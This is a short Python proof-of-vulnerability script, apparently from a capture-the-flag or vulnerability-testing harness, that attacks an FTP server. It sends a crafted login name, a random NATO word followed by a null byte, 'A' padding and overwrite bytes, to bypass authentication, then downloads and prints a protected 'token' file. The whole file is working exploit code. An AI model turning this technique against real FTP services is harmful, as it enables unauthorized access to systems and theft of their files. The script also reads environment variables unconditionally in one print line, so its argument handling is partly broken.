import sys
import os
import ftplib
import random
import signal

hexify = lambda s: [hex(ord(i)) for i in list(str(s))]
needLen = 19
nutzername = [
  'alpha', 'bravo', 'charlie', 'delta', 'echo', 'foxtrot', 'golf',
  'hotel', 'india', 'juliet', 'kilo', 'lima', 'mike', 'november',
  'oscar', 'papa', 'quebec', 'romeo', 'sierra', 'tango', 'uniform',
  'victor', 'whiskey', 'xray', 'yankee', 'zulu' ]


def handler( signum, frame):
    print('sigalrm fired - time ran out')
    print('[ERROR] POV Failed')
    exit(0)

def exploit():
    pickUser = random.choice(nutzername)
    modUser = pickUser + '\x00' + '\x41'*(needLen - len(pickUser)) + '\x05\x00\x00'
    try:
        reply = ftp.login(user=modUser, passwd='test')
    except ftplib.error_perm as e:
        print('Error {}'.format(e.args[0][:3]))
        print('[ERROR] POV Failed')
        sys.exit(1)
    else:
        print(reply)

def getToken():
    try:
        filename = 'token'
        fhandle = open(filename, 'wb')
        print('Getting ' + filename)
        reply = ftp.retrbinary('RETR ' + filename, fhandle.write)
        fhandle.close()
    except ftplib.error_perm as e:
        print('Error {}'.format(e.args[0][:3]))
        print('[ERROR] POV Failed')
        sys.exit(1)
    else: 
        print(reply)
        tokenfile=open('token','r')
        print("TOKEN=" + tokenfile.read())
        print('[SUCCESS] POV Succeeded')


def main():
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)
    print('Host ' + os.environ['HOST'] + ' and PORT: ' + os.environ['PORT'])

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(10)
    
    global ftp
    ftp = ftplib.FTP()
    ftp.connect(HOST,PORT)
    exploit()
    getToken()
    ftp.quit()
    sys.exit(0)


if __name__ == '__main__':
    main()
